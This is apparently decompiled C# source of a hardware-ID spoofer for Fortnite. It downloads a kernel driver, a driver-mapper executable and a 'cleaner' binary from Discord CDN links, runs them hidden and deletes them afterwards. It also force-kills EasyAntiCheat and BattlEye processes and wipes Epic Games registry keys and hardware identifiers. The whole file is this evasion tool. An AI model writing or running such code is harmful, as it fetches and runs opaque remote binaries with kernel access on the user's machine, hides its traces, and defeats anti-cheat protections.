using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace OPWOOFER
{
	// Token: 0x02000004 RID: 4
	internal class Spoof
	{
		// Token: 0x06000008 RID: 8 RVA: 0x000022DC File Offset: 0x000004DC
		public static void SpoofHDD()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\mapper.exe";
			string text2 = "C:\\Windows\\IME\\spoofy.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/723527620922179628/864757419623579658/Spoofy.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/734330571626512464/754986639197077514/mapper_3.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(text, text2);
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text2);
			File.Delete(text);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002380 File Offset: 0x00000580
		public static void CleanTraces(string loc)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoof.SIDCleaner + "\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("exit");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\cleaner_protected.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/739807832865767495/764472006657572904/cleaner_protected.exe", text);
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd.exe";
			process2.StartInfo.RedirectStandardInput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = false;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.Start();
			Thread.Sleep(1000);
			process2.StandardInput.WriteLine(loc ?? "");
			Thread.Sleep(15000);
			File.Delete(text);
		}

		// Token: 0x04000002 RID: 2
		private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
	}
}
